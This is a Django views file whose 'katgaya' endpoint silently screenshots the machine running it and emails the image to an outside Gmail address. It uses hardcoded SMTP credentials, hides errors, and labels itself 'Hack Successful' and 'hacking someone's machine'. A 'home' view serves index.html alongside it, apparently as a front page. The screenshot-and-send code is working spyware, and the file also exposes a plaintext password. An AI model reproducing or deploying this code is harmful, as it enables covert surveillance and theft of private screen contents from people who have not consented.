from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import smtplib
from email.message import EmailMessage
from PIL import ImageGrab as ig
import imghdr

    


@csrf_exempt
def katgaya(request):
    sender_mail = 'no.reply.python.py@gmail.com'
    password_sender = 'qwerty@123'
    l = ["bollyknow@gmail.com"]

    i = 0
    limit = 1
    #c=input('Any message to display:')
    c = "hacking someone's machine"
    subj = "Hack Successful."
    while i < limit:
        globepath = 'Desktop.jpeg'
        ig.grab().save(fp=globepath)
        with open(globepath, 'rb') as f:
            file_data = f.read()
            file_type = imghdr.what(f.name)
            file_name = f.name
        message = EmailMessage()
        message['To'] = l
        message['From'] = sender_mail
        message['Subject'] = subj
        message.set_content(c)
        message.add_attachment(file_data, maintype='image',
                               subtype=file_type, filename=file_name)
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender_mail, password_sender)
            server.send_message(message)
            # print(f"send to {l} {i+1}")
            

        except:
            # print("something went wrong!!!!!")
            # print("Try connecting to internet.")
            # print('server not connected or file is corrupted or check mail id and password')
            pass

        i += 1
    return JsonResponse({'success':'kat chuka'})

def home(request):
    return render(request,'index.html')
